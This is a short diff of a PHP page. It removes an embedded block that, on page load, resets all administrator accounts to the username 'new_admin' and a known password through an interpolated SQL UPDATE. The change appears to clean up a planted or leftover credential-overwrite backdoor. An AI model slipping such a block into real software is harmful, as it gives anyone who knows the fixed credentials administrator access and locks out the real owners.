@@ -4,22 +4,6 @@ foreach($user->fetch_array() as $k =>$v){
 	$meta[$k] = $v;
 }
 ?>
-<?php
-require_once('config.php'); // Ensure this is the correct path to your configuration file
-
-$new_username = 'new_admin'; // Replace with the new username
-$new_password = password_hash('new_password', PASSWORD_DEFAULT); // Replace with the new password and ensure it's hashed
-
-$sql = "UPDATE users SET username = '$new_username', password = '$new_password' WHERE type = 1"; // Assuming 'type = 1' is for Administrator
-if ($conn->query($sql) === TRUE) {
-    echo "Administrator credentials updated successfully";
-} else {
-    echo "Error updating credentials: " . $conn->error;
-}
-
-$conn->close();
-?>
-
 <?php if($_settings->chk_flashdata('success')): ?>
 <script>
 	alert_toast("<?php echo $_settings->flashdata('success') ?>",'success')
